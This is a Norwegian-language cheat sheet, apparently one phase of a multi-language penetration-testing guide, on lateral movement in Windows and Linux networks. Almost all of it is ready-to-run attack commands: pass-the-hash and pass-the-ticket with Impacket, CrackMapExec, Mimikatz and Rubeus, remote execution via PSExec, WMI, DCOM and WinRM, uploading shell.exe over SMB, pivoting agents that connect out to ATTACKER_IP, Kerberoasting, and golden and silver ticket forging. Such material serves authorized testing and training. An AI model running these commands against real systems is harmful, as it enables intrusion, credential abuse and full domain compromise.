# ➡️ Fase 4: Lateral bevegelse

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](04-Lateral-Movement.tr.md) • [🇬🇷 Ελληνικά](04-Lateral-Movement.el.md)

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**Mål:** Gå fra det kompromitterte systemet til andre systemer i nettverket.

---

## 🔑 Bevegelse ved hjelp av påloggingsopplysninger

### Pass-the-Hash (PTH)

*Pass-the-Hash* bruker en NTLM-hash til autentisering uten å kjenne klartekstpassordet. *Pass-the-Ticket* bruker en Kerberos-billett, og *Pass-the-Certificate* bruker et sertifikat. Tilgang avhenger fortsatt av kontoens rettigheter og tjenestens oppsett.
```bash
# Impacket PSExec med hash
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PTT)
```powershell
# Eksporter billett fra minnet (Mimikatz)
sekurlsa::tickets /export

# Importer billett
kerberos::ptt ticket.kirbi

# Eller med Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Kontroller billetten
klist
```

### Overpass-the-Hash (Pass-the-Key)
```powershell
# Mimikatz – be om TGT med NTLM-hash
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### Pass-the-Certificate
```bash
# Bruk sertifikat til autentisering
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# Med Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

## 🖥️ Metoder for ekstern kjøring

### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# Impacket WMIExec (mindre synlig)
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM med passord
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM med hash
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# Ekstern PowerShell-tilgang
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM
```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB
```bash
# Kommandokjøring med CrackMapExec
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# Filkopiering via SMB
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# På samme måte som PsExec
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP
```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# Med NTLM-hash (restricted admin-modus)
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# Aktiver RDP eksternt
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)
```bash
# SSH med passord
ssh user@192.168.1.10

# SSH med nøkkel
ssh -i id_rsa user@192.168.1.10

# SSH-tunnelering og pivotering
ssh -D 9050 user@192.168.1.10  # SOCKS-proxy
ssh -L 8080:internal:80 user@192.168.1.10  # Lokal portvideresending
```

---

## 🔄 Pivotering i nettverket (tilgang via en mellomvert)

### SSH-tunnelering

> **Merknad:** SOCKS/proxychains videreformidler ikke alle typer Nmap-prober. Originalens Nmap-eksempler er derfor ikke generelle eksempler på full nettverksskanning gjennom tunnelen.
```bash
# Lokal portvideresending (tilgang til internal:80 via localhost:8080)
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# Dynamisk SOCKS-proxy
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# Ekstern portvideresending
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel
```bash
# På angriperens maskin (server)
./chisel server --reverse --port 8080

# På målmaskinen (klient)
./chisel client ATTACKER_IP:8080 R:socks

# Bruk med proxychains
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# På angriperens maskin
./proxy -selfcert

# På målmaskinen
./agent -connect ATTACKER_IP:11601 -ignore-cert

# I proxy-konsollen
session
start
```

### Pivotering med Metasploit
```bash
# Legg til rute gjennom en Meterpreter-økt
run autoroute -s 192.168.2.0/24

# Eller manuelt
route add 192.168.2.0 255.255.255.0 1

# SOCKS-proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

## 🎫 Kerberos-angrep

### Kerberoasting
```bash
# Hent tjenestebilletter
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Knekk med hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
```bash
# Finn brukere uten forhåndsautentisering
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# Knekk hashene
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket
```powershell
# Hent først krbtgt-hashen, deretter:
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket
```powershell
# Opprett billett for en bestemt tjeneste
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## 📊 Hurtigreferanse

### Teknikker for lateral bevegelse

> **Presisering:** Porttabellen er forenklet. WMI/DCOM kan også kreve dynamiske RPC-porter, og WMIExec bruker normalt SMB for å hente kommandoutdata.

| Teknikk | Port | Verktøy |
|-----------|------|------|
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

### Nødvendige påloggingsopplysninger

| Metode | Krav |
|--------|-------------|
| Pass-the-Hash | NTLM-hash |
| Pass-the-Ticket | Kerberos-billett |
| PSExec | Administrator + SMB-tilgang |
| WinRM | WinRM aktivert + administrator |
| RDP | RDP aktivert + medlemskap i RDP-gruppen |

---

## 🔗 Relaterte hurtigguider

- [Impacket](../../Impacket/README.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/README.md)
- [Rubeus](../../Rubeus/README.md)

---

**Forrige fase:** [← 03 - Rettighetseskalering](./03-Privilege-Escalation.nb.md)

**Neste fase:** [05 - Vedvarende tilgang →](./05-Persistence.nb.md)
